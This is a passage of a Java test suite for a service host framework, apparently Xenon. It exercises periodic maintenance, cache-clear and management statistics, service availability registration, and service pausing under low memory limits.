(st.name.equals(MinimalTestService.STAT_NAME_MAINTENANCE_SUCCESS_COUNT)) {\n                        servicesWithMaintenance.put(e.getKey(), e.getValue());\n                        continue;\n                    }\n                    if (st.name.equals(MinimalTestService.STAT_NAME_MAINTENANCE_FAILURE_COUNT)) {\n                        maintFailureCount++;\n                        continue;\n                    }\n                }\n\n                assertTrue(\"maintenance failed\", maintFailureCount == 0);\n            }\n\n            // verify that every single service has seen at least one maintenance interval\n            if (servicesWithMaintenance.size() < this.serviceCount) {\n                this.host.log(\"Services with maintenance: %d, expected %d\",\n                        servicesWithMaintenance.size(), this.serviceCount);\n                Thread.sleep(maintIntervalMillis * 2);\n                continue;\n            }\n\n            if (cacheMissCount < 1) {\n                this.host.log(\"No cache misses seen\");\n                Thread.sleep(maintIntervalMillis * 2);\n                continue;\n            }\n\n            if (cacheClearCount < 1) {\n                this.host.log(\"No cache clears seen\");\n                Thread.sleep(maintIntervalMillis * 2);\n                continue;\n            }\n\n            Map<String, ServiceStat> mgmtStats = this.host.getServiceStats(this.host.getManagementServiceUri());\n            cacheClearStat = mgmtStats.get(ServiceHostManagementService.STAT_NAME_SERVICE_CACHE_CLEAR_COUNT);\n            if (cacheClearStat == null || cacheClearStat.latestValue < 1) {\n                this.host.log(\"Cache clear stat on management service not seen\");\n                Thread.sleep(maintIntervalMillis * 2);\n                continue;\n            }\n            break;\n        }\n        long end = System.nanoTime() / 1000;\n\n        if (cacheClearStat == null || cacheClearStat.latestValue < 1) {\n            throw new IllegalStateException(\n                    \"Cache clear stat on management service not observed\");\n        }\n\n        this.host.log(\"State cache misses: %d, cache clears: %d\", cacheMissCount, cacheClearCount);\n\n        double expectedMaintIntervals = Math.max(1,\n                (end - start) / this.host.getMaintenanceIntervalMicros());\n\n        // allow variance up to 2x of expected intervals. We have the interval set to 100ms\n        // and we are running tests on VMs, in over subscribed CI. So we expect significant\n        // scheduling variance. This test is extremely consistent on a local machine\n        expectedMaintIntervals *= 2;\n\n        for (Entry<URI, ServiceStats> e : servicesWithMaintenance.entrySet()) {\n\n            ServiceStat maintStat = e.getValue().entries.get(Service.STAT_NAME_MAINTENANCE_COUNT);\n            this.host.log(\"%s has %f intervals\", e.getKey(), maintStat.latestValue);\n            if (maintStat.latestValue > expectedMaintIntervals + 2) {\n                String error = String.format(\"Expected %f, got %f. Too many stats for service %s\",\n                        expectedMaintIntervals + 2,\n                        maintStat.latestValue,\n                        e.getKey());\n                throw new IllegalStateException(error);\n            }\n\n        }\n\n\n        if (cacheMissCount < 1) {\n            throw new IllegalStateException(\n                    \"No cache misses observed through stats\");\n        }\n\n        long slowMaintInterval = this.host.getMaintenanceIntervalMicros() * 10;\n        end = System.nanoTime() / 1000;\n        expectedMaintIntervals = Math.max(1, (end - start) / slowMaintInterval);\n\n        // verify that services with slow maintenance did not get more than one maint cycle\n        URI[] statUris = buildStatsUris(this.serviceCount, slowMaintServices);\n        Map<URI, ServiceStats> stats = this.host.getServiceState(null,\n                ServiceStats.class, statUris);\n\n        for (ServiceStats s : stats.values()) {\n\n            for (ServiceStat st : s.entries.values()) {\n                if (st.name.equals(Service.STAT_NAME_MAINTENANCE_COUNT)) {\n                    // give a slop of 3 extra intervals:\n                    // 1 due to rounding, 2 due to interval running before we do setMaintenance\n                    // to a slower interval ( notice we start services, then set the interval)\n                    if (st.latestValue > expectedMaintIntervals + 3) {\n                        throw new IllegalStateException(\n                                \"too many maintenance runs for slow maint. service:\"\n                                        + st.latestValue);\n                    }\n                }\n            }\n        }\n\n        this.host.testStart(services.size());\n        // delete all minimal service instances\n        for (Service s : services) {\n            this.host.send(Operation.createDelete(s.getUri()).setBody(new ServiceDocument())\n                    .setCompletion(this.host.getCompletion()));\n        }\n        this.host.testWait();\n\n        this.host.testStart(slowMaintServices.size());\n        // delete all minimal service instances\n        for (Service s : slowMaintServices) {\n            this.host.send(Operation.createDelete(s.getUri()).setBody(new ServiceDocument())\n                    .setCompletion(this.host.getCompletion()));\n        }\n        this.host.testWait();\n\n        // before we increase maintenance interval, verify stats reported by MGMT service\n        verifyMgmtServiceStats();\n\n        // now validate that service handleMaintenance does not get called right after start, but at least\n        // one interval later. We set the interval to 30 seconds so we can verify it did not get called within\n        // one second or so\n        long maintMicros = TimeUnit.SECONDS.toMicros(30);\n        this.host.setMaintenanceIntervalMicros(maintMicros);\n\n        // there is a small race: if the host scheduled a maintenance task already, using the default\n        // 1 second interval, its possible it executes maintenance on the newly added services using\n        // the 1 second schedule, instead of 30 seconds. So wait at least one maint. interval with the\n        // default interval\n        Thread.sleep(1000);\n\n        slowMaintServices = this.host.doThroughputServiceStart(\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null);\n\n        // sleep again and check no maintenance run right after start\n        Thread.sleep(250);\n\n        statUris = buildStatsUris(this.serviceCount, slowMaintServices);\n        stats = this.host.getServiceState(null,\n                ServiceStats.class, statUris);\n\n        for (ServiceStats s : stats.values()) {\n            for (ServiceStat st : s.entries.values()) {\n                if (st.name.equals(Service.STAT_NAME_MAINTENANCE_COUNT)) {\n                    throw new IllegalStateException(\"Maintenance run before first expiration:\"\n                            + Utils.toJsonHtml(s));\n                }\n            }\n        }\n\n    }\n\n    private void verifyMgmtServiceStats() {\n        URI serviceHostMgmtURI = UriUtils.buildUri(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.waitFor(\"wait for http stat update.\", () -> {\n            Operation get = Operation.createGet(this.host, ServiceHostManagementService.SELF_LINK);\n            this.host.send(get.forceRemote());\n            this.host.send(get.clone().forceRemote().setConnectionSharing(true));\n\n            Map<String, ServiceStat> hostMgmtStats = this.host\n                    .getServiceStats(serviceHostMgmtURI);\n            ServiceStat http1ConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_CONNECTION_COUNT_PER_DAY);\n            if (http1ConnectionCountDaily == null\n                    || http1ConnectionCountDaily.version < 3) {\n                return false;\n            }\n            ServiceStat http2ConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_CONNECTION_COUNT_PER_DAY);\n            if (http2ConnectionCountDaily == null\n                    || http2ConnectionCountDaily.version < 3) {\n                return false;\n            }\n            return true;\n        });\n\n\n        this.host.waitFor(\"stats never populated\", () -> {\n            // confirm host global time series stats have been created / updated\n            Map<String, ServiceStat> hostMgmtStats = this.host.getServiceStats(serviceHostMgmtURI);\n\n            ServiceStat serviceCount = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_SERVICE_COUNT);\n            if (serviceCount == null || serviceCount.latestValue < 2) {\n                this.host.log(\"not ready: %s\", Utils.toJson(serviceCount));\n                return false;\n            }\n\n            ServiceStat freeMemDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_MEMORY_BYTES_PER_DAY);\n            if (!isTimeSeriesStatReady(freeMemDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeMemDaily));\n                return false;\n            }\n            ServiceStat freeMemHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_MEMORY_BYTES_PER_HOUR);\n            if (!isTimeSeriesStatReady(freeMemHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeMemHourly));\n                return false;\n            }\n            ServiceStat freeDiskDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_DISK_BYTES_PER_DAY);\n            if (!isTimeSeriesStatReady(freeDiskDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeDiskDaily));\n                return false;\n            }\n            ServiceStat freeDiskHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_DISK_BYTES_PER_HOUR);\n            if (!isTimeSeriesStatReady(freeDiskHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeDiskHourly));\n                return false;\n            }\n            ServiceStat cpuUsageDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_CPU_USAGE_PCT_PER_DAY);\n            if (!isTimeSeriesStatReady(cpuUsageDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(cpuUsageDaily));\n                return false;\n            }\n            ServiceStat cpuUsageHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_CPU_USAGE_PCT_PER_HOUR);\n            if (!isTimeSeriesStatReady(cpuUsageHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(cpuUsageHourly));\n                return false;\n            }\n            ServiceStat threadCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_JVM_THREAD_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(threadCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(threadCountDaily));\n                return false;\n            }\n            ServiceStat threadCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_JVM_THREAD_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(threadCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(threadCountHourly));\n                return false;\n            }\n\n            ServiceStat http1PendingCount = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_PENDING_OP_COUNT);\n            if (http1PendingCount == null) {\n                this.host.log(\"http1 pending op stats not present\");\n                return false;\n            }\n            ServiceStat http2PendingCount = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_PENDING_OP_COUNT);\n            if (http2PendingCount == null) {\n                this.host.log(\"http2 pending op stats not present\");\n                return false;\n            }\n\n            TestUtilityService.validateTimeSeriesStat(freeMemDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeMemHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeDiskDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeDiskHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(cpuUsageDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(cpuUsageHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(threadCountDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(threadCountHourly,\n                    TimeUnit.MINUTES.toMillis(1));\n            return true;\n        });\n    }\n\n    private boolean isTimeSeriesStatReady(ServiceStat st) {\n        return st != null && st.timeSeriesStats != null;\n    }\n\n    private void verifyMaintenanceDelayStat(long intervalMicros) throws Throwable {\n        // verify state on maintenance delay takes hold\n        this.host.setMaintenanceIntervalMicros(intervalMicros);\n        MinimalTestService ts = new MinimalTestService();\n        ts.delayMaintenance = true;\n        ts.toggleOption(ServiceOption.PERIODIC_MAINTENANCE, true);\n        ts.toggleOption(ServiceOption.INSTRUMENTATION, true);\n        MinimalTestServiceState body = new MinimalTestServiceState();\n        body.id = UUID.randomUUID().toString();\n        ts = (MinimalTestService) this.host.startServiceAndWait(ts, UUID.randomUUID().toString(),\n                body);\n        MinimalTestService finalTs = ts;\n        this.host.waitFor(\"Maintenance delay stat never reported\", () -> {\n            ServiceStats stats = this.host.getServiceState(null, ServiceStats.class,\n                    UriUtils.buildStatsUri(finalTs.getUri()));\n            if (stats.entries == null || stats.entries.isEmpty()) {\n                Thread.sleep(intervalMicros / 1000);\n                return false;\n            }\n\n            ServiceStat delayStat = stats.entries\n                    .get(Service.STAT_NAME_MAINTENANCE_COMPLETION_DELAYED_COUNT);\n            ServiceStat durationStat = stats.entries.get(Service.STAT_NAME_MAINTENANCE_DURATION);\n            if (delayStat == null) {\n                Thread.sleep(intervalMicros / 1000);\n                return false;\n            }\n\n            if (durationStat == null || (durationStat != null && durationStat.logHistogram == null)) {\n                return false;\n            }\n            return true;\n        });\n\n        ts.toggleOption(ServiceOption.PERIODIC_MAINTENANCE, false);\n    }\n\n    @Test\n    public void registerForServiceAvailabilityTimeout()\n            throws Throwable {\n        setUp(false);\n        int c = 10;\n        this.host.testStart(c);\n        // issue requests to service paths we know do not exist, but induce the automatic\n        // queuing behavior for service availability, by setting targetReplicated = true\n        for (int i = 0; i < c; i++) {\n            this.host.send(Operation\n                    .createGet(UriUtils.buildUri(this.host, UUID.randomUUID().toString()))\n                    .setTargetReplicated(true)\n                    .setExpiration(Utils.fromNowMicrosUtc(TimeUnit.SECONDS.toMicros(1)))\n                    .setCompletion(this.host.getExpectedFailureCompletion()));\n        }\n        this.host.testWait();\n    }\n\n    @Test\n    public void registerForFactoryServiceAvailability()\n            throws Throwable {\n        setUp(false);\n        this.host.startFactoryServicesSynchronously(new TestFactoryService.SomeFactoryService(),\n                SomeExampleService.createFactory());\n        this.host.waitForServiceAvailable(SomeExampleService.FACTORY_LINK);\n        this.host.waitForServiceAvailable(TestFactoryService.SomeFactoryService.SELF_LINK);\n        try {\n            // not a factory so will fail\n            this.host.startFactoryServicesSynchronously(new ExampleService());\n            throw new IllegalStateException(\"Should have failed\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        try {\n            // does not have SELF_LINK/FACTORY_LINK so will fail\n            this.host.startFactoryServicesSynchronously(new MinimalFactoryTestService());\n            throw new IllegalStateException(\"Should have failed\");\n        } catch (IllegalArgumentException e) {\n\n        }\n    }\n\n    public static class SomeExampleService extends StatefulService {\n        public static final String FACTORY_LINK = UUID.randomUUID().toString();\n\n        public static Service createFactory() {\n            return FactoryService.create(SomeExampleService.class, SomeExampleServiceState.class);\n        }\n\n        public SomeExampleService() {\n            super(SomeExampleServiceState.class);\n        }\n\n        public static class SomeExampleServiceState extends ServiceDocument {\n            public String name ;\n        }\n    }\n\n    @Test\n    public void registerForServiceAvailabilityBeforeAndAfterMultiple()\n            throws Throwable {\n        setUp(false);\n        int serviceCount = 100;\n        this.host.testStart(serviceCount * 3);\n        String[] links = new String[serviceCount];\n        for (int i = 0; i < serviceCount; i++) {\n            URI u = UriUtils.buildUri(this.host, UUID.randomUUID().toString());\n            links[i] = u.getPath();\n            this.host.registerForServiceAvailability(this.host.getCompletion(),\n                    u.getPath());\n            this.host.startService(Operation.createPost(u),\n                    ExampleService.createFactory());\n            this.host.registerForServiceAvailability(this.host.getCompletion(),\n                    u.getPath());\n        }\n        this.host.registerForServiceAvailability(this.host.getCompletion(),\n                links);\n\n        this.host.testWait();\n    }\n\n    @Test\n    public void registerForServiceAvailabilityWithReplicaBeforeAndAfterMultiple()\n            throws Throwable {\n        setUp(true);\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n\n        String[] links = new String[] {\n                ExampleService.FACTORY_LINK,\n                ServiceUriPaths.CORE_AUTHZ_RESOURCE_GROUPS,\n                ServiceUriPaths.CORE_AUTHZ_USERS,\n                ServiceUriPaths.CORE_AUTHZ_ROLES,\n                ServiceUriPaths.CORE_AUTHZ_USER_GROUPS };\n\n        // register multiple factories, before host start\n        TestContext ctx = this.host.testCreate(links.length * 10);\n        for (int i = 0; i < 10; i++) {\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true, links);\n        }\n        this.host.start();\n        this.host.testWait(ctx);\n\n        // register multiple factories, after host start\n        for (int i = 0; i < 10; i++) {\n            ctx = this.host.testCreate(links.length);\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true, links);\n            this.host.testWait(ctx);\n        }\n\n        // verify that the new replica aware service available works with child services\n        int serviceCount = 10;\n        ctx = this.host.testCreate(serviceCount * 3);\n        links = new String[serviceCount];\n        for (int i = 0; i < serviceCount; i++) {\n            URI u = UriUtils.buildUri(this.host, UUID.randomUUID().toString());\n            links[i] = u.getPath();\n            this.host.registerForServiceAvailability(ctx.getCompletion(),\n                    u.getPath());\n            this.host.startService(Operation.createPost(u),\n                    ExampleService.createFactory());\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true,\n                    u.getPath());\n        }\n        this.host.registerForServiceAvailability(ctx.getCompletion(),\n                links);\n\n        this.host.testWait(ctx);\n    }\n\n    public static class ParentService extends StatefulService {\n\n        public static final String FACTORY_LINK = \"/test/parent\";\n\n        public static Service createFactory() {\n            return FactoryService.create(ParentService.class);\n        }\n\n        public ParentService() {\n            super(ExampleServiceState.class);\n            super.toggleOption(ServiceOption.PERSISTENCE, true);\n        }\n    }\n\n    public static class ChildDependsOnParentService extends StatefulService {\n        public static final String FACTORY_LINK = \"/test/child-of-parent\";\n\n        public static Service createFactory() {\n            return FactoryService.create(ChildDependsOnParentService.class);\n        }\n\n        public ChildDependsOnParentService() {\n            super(ExampleServiceState.class);\n            super.toggleOption(ServiceOption.PERSISTENCE, true);\n        }\n\n        @Override\n        public void handleStart(Operation post) {\n            // do not complete post for start, until we see a instance of the parent\n            // being available. If there is an issue with factory start, this will\n            // deadlock\n            ExampleServiceState st = getBody(post);\n            String id = Service.getId(st.documentSelfLink);\n            String parentPath = UriUtils.buildUriPath(ParentService.FACTORY_LINK, id);\n            post.nestCompletion((o, e) -> {\n                if (e != null) {\n                    post.fail(e);\n                    return;\n                }\n                logInfo(\"Parent service started!\");\n                post.complete();\n            });\n            getHost().registerForServiceAvailability(post, parentPath);\n        }\n    }\n\n    @Test\n    public void registerForServiceAvailabilityWithCrossDependencies()\n            throws Throwable {\n        setUp(false);\n        this.host.startFactoryServicesSynchronously(ParentService.createFactory(),\n                ChildDependsOnParentService.createFactory());\n        String id = UUID.randomUUID().toString();\n        TestContext ctx = this.host.testCreate(2);\n        // start a parent instance and a child instance.\n        ExampleServiceState st = new ExampleServiceState();\n        st.documentSelfLink = id;\n        st.name = id;\n        Operation post = Operation\n                .createPost(UriUtils.buildUri(this.host, ParentService.FACTORY_LINK))\n                .setCompletion(ctx.getCompletion())\n                .setBody(st);\n        this.host.send(post);\n        post = Operation\n                .createPost(UriUtils.buildUri(this.host, ChildDependsOnParentService.FACTORY_LINK))\n                .setCompletion(ctx.getCompletion())\n                .setBody(st);\n        this.host.send(post);\n        ctx.await();\n\n        // we create the two persisted instances, and they started. Now stop the host and confirm restart occurs\n        this.host.stop();\n        this.host.setPort(0);\n        if (!VerificationHost.restartStatefulHost(this.host, true)) {\n            this.host.log(\"Failed restart of host, aborting\");\n            return;\n        }\n        this.host.startFactoryServicesSynchronously(ParentService.createFactory(),\n                ChildDependsOnParentService.createFactory());\n\n        // verify instance services started\n        ctx = this.host.testCreate(1);\n        String childPath = UriUtils.buildUriPath(ChildDependsOnParentService.FACTORY_LINK, id);\n        Operation get = Operation.createGet(UriUtils.buildUri(this.host, childPath))\n                .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_QUEUE_FOR_SERVICE_AVAILABILITY)\n                .setCompletion(ctx.getCompletion());\n        this.host.send(get);\n        ctx.await();\n    }\n\n    @Test\n    public void queueRequestForServiceWithNonFactoryParent() throws Throwable {\n        setUp(false);\n        class DelayedStartService extends StatelessService {\n            @Override\n            public void handleStart(Operation start) {\n                getHost().schedule(() -> {\n                    start.complete();\n                }, 100, TimeUnit.MILLISECONDS);\n            }\n\n            @Override\n            public void handleGet(Operation get) {\n                get.complete();\n            }\n        }\n\n        Operation startOp = Operation.createPost(UriUtils.buildUri(this.host, \"/delayed\"));\n        this.host.startService(startOp, new DelayedStartService());\n\n        // Don't wait for the service to be started, because it intentionally takes a while.\n        // The GET operation below should be queued until the service's start completes.\n        Operation getOp = Operation\n                .createGet(UriUtils.buildUri(this.host, \"/delayed\"))\n                .setCompletion(this.host.getCompletion());\n        this.host.testStart(1);\n        this.host.send(getOp);\n        this.host.testWait();\n    }\n\n    //override setProcessingStage() of ExampleService to randomly\n    // fail some pause operations\n    static class PauseExampleService extends ExampleService {\n\n        public static final String FACTORY_LINK = ServiceUriPaths.CORE + \"/pause-examples\";\n        public static final String STAT_NAME_ABORT_COUNT = \"abortCount\";\n\n        public static FactoryService createFactory() {\n            return FactoryService.create(PauseExampleService.class);\n        }\n\n        public PauseExampleService() {\n            super();\n            // we only pause on demand load services\n            toggleOption(ServiceOption.ON_DEMAND_LOAD, true);\n            // ODL services will normally just stop, not pause. To make them pause\n            // we need to either add subscribers or stats. We toggle the INSTRUMENTATION\n            // option (even if ExampleService already sets it, we do it again in case it\n            // changes in the future)\n            toggleOption(ServiceOption.INSTRUMENTATION, true);\n        }\n\n        @Override\n        public ServiceRuntimeContext setProcessingStage(Service.ProcessingStage stage) {\n            if (stage == Service.ProcessingStage.PAUSED) {\n                if (new Random().nextBoolean()) {\n                    this.adjustStat(STAT_NAME_ABORT_COUNT, 1);\n                    throw new CancellationException(\"Cannot pause service.\");\n                }\n            }\n            return super.setProcessingStage(stage);\n        }\n    }\n\n    @Test\n    public void servicePauseDueToMemoryPressure() throws Throwable {\n        setUp(true);\n        this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n\n        if (this.serviceCount >= 1000) {\n            this.host.setStressTest(true);\n        }\n\n        // Set the threshold low to induce it during this test, several times. This will\n        // verify that refreshing the index writer does not break the index semantics\n        LuceneDocumentIndexService\n                .setIndexFileCountThresholdForWriterRefresh(this.indexFileThreshold);\n\n        // set memory limit low to force service pause\n        this.host.setServiceMemoryLimit(ServiceHost.ROOT_PATH, 0.00001);\n        beforeHostStart(this.host);\n\n        this.host.setPort(0);\n        long delayMicros = TimeUnit.SECONDS\n                .toMicros(this.serviceCacheClearDelaySeconds);\n        this.host.setServiceCacheClearDelayMicros(delayMicros);\n\n        // disable auto sync since it might cause a false negative (skipped pauses) when\n        // it kicks in within a few milliseconds from host start, during induced pause\n        this.host.setPeerSynchronizationEnabled(false);\n        long delayMicrosAfter = this.host.getServiceCacheClearDelayMicros();\n        assertTrue(delayMicros == delayMicrosAfter);\n        this.host.start();\n\n        this.host.setSystemAuthorizationContext();\n        TestContext ctxQuery = this.host.testCreate(1);\n        String user = \"foo@bar.com\";\n        Query.Builder queryBuilder = Query.Builder.create()\n                .addFieldClause(ServiceDocument.FIELD_NAME_KIND, Utils.buildKind(ExampleServiceState.class));\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserEmail(user)\n                .setUserSelfLink(user)\n                .setUserPassword(user)\n                .setResourceQuery(queryBuilder.build())\n                .setCompletion((ex) -> {\n                    if (ex != null) {\n                        ctxQuery.failIteration(ex);\n                        return;\n                    }\n                    ctxQuery.completeIteration();\n                }).start();\n        ctxQuery.await();\n        this.host.startFactory(PauseExampleService.class,\n                PauseExampleService::createFactory);\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, PauseExampleService.class);\n        this.host.waitForServiceAvailable(PauseExampleService.FACTORY_LINK);\n        this.host.resetSystemAuthorizationContext();\n\n        AtomicLong selfLinkCounter = new AtomicLong();\n        String prefix = \"instance-\";\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            s.documentSelfLink = prefix + selfLinkCounter.incrementAndGet();\n            o.setBody(s);\n        };\n\n        // Create a number of child services.\n        this.host.assumeIdentity(UriUtils.buildUriPath(UserService.FACTORY_LINK, user));\n\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        // Wait for the next maintenance interval to trigger. This will pause all the services\n        // we just created since the memory limit was set so low.\n        long expectedPauseTime = Utils.fromNowMicrosUtc(this.host\n                .getMaintenanceIntervalMicros() * 5);\n        while (this.host.getState().lastMaintenanceTimeUtcMicros < expectedPauseTime) {\n            // memory limits are applied during maintenance, so wait for a few intervals.\n            Thread.sleep(this.host.getMaintenanceIntervalMicros() / 1000);\n        }\n\n        // Let's now issue some updates to verify paused services get resumed.\n        int updateCount = 100;\n        if (this.testDurationSeconds > 0 || this.host.isStressTest()) {\n            updateCount = 1;\n        }\n        patchExampleServices(states, updateCount);\n\n        TestContext ctxGet = this.host.testCreate(states.size());\n        for (ExampleServiceState st : states.values()) {\n            Operation get = Operation.createGet(UriUtils.buildUri(this.host, st.documentSelfLink))\n                    .setCompletion(\n                            (o, e) -> {\n                                if (e != null) {\n                                    this.host.failIteration(e);\n                                    return;\n                                }\n\n                                ExampleServiceState rsp = o.getBody(ExampleServiceState.class);\n                                if (!rsp.name.startsWith(\"updated\")) {\n                                    ctxGet.fail(new IllegalStateException(Utils\n                                            .toJsonHtml(rsp)));\n                                    return;\n                                }\n                                ctxGet.complete();\n                            });\n            this.host.send(get);\n        }\n        this.host.testWait(ctxGet);\n\n        if (this.testDurationSeconds == 0) {\n            verifyPauseResumeStats(states);\n        }\n\n        // Let's set the service memory limit back to normal and issue more updates to ensure\n        // that the services still continue to operate as expected.\n        this.host\n                .setServiceMemoryLimit(ServiceHost.ROOT_PATH, ServiceHost.DEFAULT_PCT_MEMORY_LIMIT);\n        patchExampleServices(states, updateCount);\n\n        states.clear();\n        // Long running test. Keep adding services, expecting pause to occur and free up memory so the\n        // number of service instances exceeds available memory.\n        Date exp = new Date(TimeUnit.MICROSECONDS.toMillis(\n                Utils.getSystemNowMicrosUtc())\n                + TimeUnit.SECONDS.toMillis(this.testDurationSeconds));\n\n        this.host.setOperationTimeOutMicros(\n                TimeUnit.SECONDS.toMicros(this.host.getTimeoutSeconds()));\n\n        while (new Date().before(exp)) {\n            states = this.host.doFactoryChildServiceStart(null,\n                    this.serviceCount,\n                    ExampleServiceState.class, bodySetter, factoryURI);\n            Thread.sleep(500);\n\n            this.host.log(\"created %d services, created so far: %d, attached count: %d\",\n                    this.serviceCount,\n                    selfLinkCounter.get(),\n                    this.host.getState().serviceCount);\n            Runtime.getRuntime().gc();\n            this.host.logMemoryInfo();\n\n            File f = new File(this.host.getStorageSandbox());\n            this.host.log(\"Sandbox: %s, Disk: free %d, usable: %d, total: %d\", f.toURI(),\n                    f.getFreeSpace(),\n                    f.getUsableSpace(),\n                    f.getTotalSpace());\n\n            // let a couple of maintenance intervals run\n            Thread.sleep(TimeUnit.MICROSECONDS.toMillis(this.host.getMaintenanceIntervalMicros()) * 2);\n\n            // ping every service we created to see if they can be resumed\n            TestContext getCtx = this.host.testCreate(states.size());\n            for (URI u : states.keySet()) {\n                Operation get = Operation.createGet(u).setCompletion((o, e) -> {\n                    if (e == null) {\n                        getCtx.complete();\n                        return;\n                    }\n\n                    if (o.getStatusCode() == Operation.STATUS_CODE_TIMEOUT) {\n                        // check the document index, if we ever created this service\n                        try {\n                            this.host.createAndWaitSimpleDirectQuery(\n                                    ServiceDocument.FIELD_NAME_SELF_LINK, o.getUri().getPath(), 1, 1);\n                        } catch (Throwable e1) {\n                            getCtx.fail(e1);\n                            return;\n                        }\n                    }\n                    getCtx.fail(e);\n                });\n                this.host.send(get);\n            }\n            this.host.testWait(getCtx);\n\n            long limit = this.serviceCount * 30;\n            if (selfLinkCounter.get() <= limit) {\n                continue;\n            }\n\n            TestContext ctxDelete = this.host.testCreate(states.size());\n            // periodically, delete services we created (and likely paused) several passes ago\n            for (int i = 0; i < states.size(); i++) {\n                String childPath = UriUtils.buildUriPath(factoryURI.getPath(), prefix + \"\"\n                        + (selfLinkCounter.get() - limit + i));\n                Operation delete = Operation.createDelete(this.host, childPath);\n                delete.setCompletion((o, e) -> {\n                    ctxDelete.complete();\n                });\n                this.host.send(delete);\n            }\n            ctxDelete.await();\n\n            File indexDir = new File(this.host.getStorageSandbox());\n            indexDir = new File(indexDir, ServiceContextIndexService.FILE_PATH);\n            long fileCount = Files.list(indexDir.toPath()).count();\n            this.host.log(\"Paused file count %d\", fileCount);\n        }\n    }\n\n    private void deletePausedFiles() throws IOException {\n        File indexDir = new File(this.host.getStorageSandbox());\n        indexDir = new File(indexDir, ServiceContextIndexService.FILE_PATH);\n        if (!indexDir.exists()) {\n            return;\n        }\n        AtomicInteger count = new AtomicInteger();\n        Files.list(indexDir.toPath()).forEach((p) -> {\n            try {\n                Files.deleteIfExists(p);\n                count.incrementAndGet();\n            } catch (Exception e) {\n\n            }\n        });\n        this.host.log(\"Deleted %d files\", count.get());\n    }\n\n    private void verifyPauseResumeStats(Map<URI, ExampleServiceState> states) throws Throwable {\n        // Let's now query stats for each service. We will use these stats to verify that the\n        // services did get paused and resumed.\n        WaitHandler wh = () -> {\n            int totalServicePauseResumeOrAbort = 0;\n            int pauseCount = 0;\n            List<URI> statsUris = new ArrayList<>();\n            // Verify the stats for each service show that the service was paused and resumed\n            for (ExampleServiceState st : states.values()) {\n                URI serviceUri = UriUtils.buildStatsUri(this.host, st.documentSelfLink);\n                statsUris.add(serviceUri);\n            }\n\n            Map<URI, ServiceStats> statsPerService = this.host.getServiceState(null,\n                    ServiceStats.class, statsUris);\n            for (ServiceStats serviceStats : statsPerService.values()) {\n                ServiceStat pauseStat = serviceStats.entries.get(Service.STAT_NAME_PAUSE_COUNT);\n                ServiceStat resumeStat = serviceStats.entries.get(Service.STAT_NAME_RESUME_COUNT);\n                ServiceStat abortStat = serviceStats.entries\n                        .get(PauseExampleService.STAT_NAME_ABORT_COUNT);\n                if (abortStat == null && pauseStat == null && resumeStat == null) {\n                    return false;\n                }\n                if (pauseStat != null) {\n                    pauseCount += pauseStat.latestValue;\n                }\n                totalServicePauseResumeOrAbort++;\n            }\n\n            if (totalServicePauseResumeOrAbort < states.size() || pauseCount == 0) {\n                this.host.log(\n                        \"ManagementSvc total pause + resume or abort was less than service count.\"\n                                + \"Abort,Pause,Resume: %d, pause:%d (service count: %d)\",\n                        totalServicePauseResumeOrAbort, pauseCount, states.size());\n                return false;\n            }\n\n            this.host.log(\"Pause count: %d\", pauseCount);\n            return true;\n        };\n        this.host.waitFor(\"Service stats did not get updated\", wh);\n    }\n\n    @Test\n    public void maintenanceForOnDemandLoadServices() throws Throwable {\n        